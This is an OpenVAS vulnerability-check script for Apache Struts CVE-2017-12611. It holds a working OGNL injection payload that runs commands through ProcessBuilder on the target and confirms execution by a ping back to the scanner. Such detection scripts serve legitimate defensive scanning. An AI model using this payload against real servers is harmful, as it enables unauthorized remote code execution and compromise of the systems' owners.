###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_CVE_2017_12611.nasl 7111 2017-09-13 05:34:20Z mwiegand $
#
# Apache Struts 'CVE-2017-12611' Remote Code Execution Vulnerability
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108243");
  script_version("$Revision: 7111 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-09-13 07:34:20 +0200 (Wed, 13 Sep 2017) $");
  script_tag(name:"creation_date", value:"2017-09-11 12:00:00 +0200 (Mon, 11 Sep 2017)");
  script_cve_id("CVE-2017-12611");
  script_name("Apache Struts 'CVE-2017-12611' Remote Code Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning", "Settings/disable_generic_webapp_scanning");

  script_xref(name:"URL", value:"https://struts.apache.org/docs/s2-053.html");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow an attacker to execute arbitrary code in the context of the affected application.");

  script_tag(name:"vuldetect", value:"Try to execute a command by sending a special crafted HTTP GET request.

  NOTE: This script needs to check every parameter of a web application with various crafted requests. This is a time-consuming process and
  this script won't run by default. If you want to check for this vulnerability please enable 'Enable generic web application scanning'
  within the script preferences of the NVT 'Global variable settings (OID: 1.3.6.1.4.1.25623.1.0.12288)'.");

  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory for more information.");

  script_tag(name:"summary", value:"Apache Struts is prone to a remote code-execution vulnerability.");

  script_tag(name:"affected", value:"Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10.");

  script_tag(name:"solution_type", value: "VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");
include("url_func.inc");

# <-- START TODO: Move to own include, this is partly adapted from sql_injection.nasl and might be useful for other NVTs as well...
function _create_exploit_req( cgiArray, ex ) {

  local_var cgiArray, ex, pseudocount, rrayval, tmpf, data, param, z, url, i, urls;

  urls = make_array();

  pseudocount = 0;
  foreach rrayval( cgiArray ) {
    if( pseudocount >= 2 ) {
      if( "]" >< rrayval ) {
        pseudocount--;
        tmpf = ereg_replace( pattern:"\[|\]", string:rrayval, replace:"" );
        data[pseudocount] = tmpf;
      } else {
        param[pseudocount] = rrayval;
      }
    } else {
      param[pseudocount] = rrayval;
    }
    pseudocount++;
  }

  for( z = 2; z < max_index( param ); z++ ) {
    url = string( param[0], "?" );
    for( i = 2; i < max_index( param ); i++ ) {
      if( z == i ) {
        url += param[i] + "=" + ex;
      } else {
        if( data[i] ) {
          url += param[i] + "=" + data[i];
        } else {
          url += param[i] + "=";
        }
      }
      if( param[i + 1] ) {
        url += "&";
      }
    }
    urls = make_list( urls, url + "&" );
  }
  return urls;
}
# END TODO -->

port = get_http_port( default:80 );

cgis = get_kb_list( "www/" + port + "/cgis" );
if( ! cgis ) exit( 0 );

foreach cgi( cgis ) {
break;
  cgiArray = split( cgi, sep:" ", keep:FALSE );

  cmds = exploit_commands();

  foreach cmd( keys( cmds ) ) {

    c  = "{'" + cmds[ cmd ] + "'}";

    ex = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" + 
         "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." + 
         "opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses()." + 
         "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." + 
         "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";

    urls = _create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
    foreach url( urls ) {

      req = http_get_req( port:port, url:url );
      buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

      if( egrep( pattern:cmd, string:buf ) ) {
        report = 'It was possible to execute the command `' + cmds[ cmd ] + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + buf;
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

foreach cgi( cgis ) {

  if( host_runs( "Windows" ) == "yes" ) {
    cleancmd = "ping -n 3 " + this_host();
    pingcmd = '"ping","-n","3","' + this_host() + '"';
    win = TRUE;
  } else {
    check = "_OpenVAS_" + rand_str( length:6 );
    pattern = hexstr( check );
    cleancmd = "ping -c 3 -p " + pattern + " " + this_host();
    pingcmd = '"ping","-c","3","-p","' + pattern + '","' + this_host() + '"';
  }

  c  = "{" + pingcmd + "}";

  ex = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" + 
       "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." + 
       "opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses()." + 
       "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." + 
       "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";

  cgiArray = split( cgi, sep:" ", keep:FALSE );

  urls = _create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
  foreach url( urls ) {

    req = http_get_req( port:port, url:url );
    res = send_capture( socket:soc, data:req, timeout:2, pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
    data = get_icmp_element( icmp:res, element:"data" );

    if( data && ( win || check >< data ) ) {
      close( soc );
      report = 'It was possible to execute the command `' + cleancmd + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + data;
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

close( soc );
exit( 0 );
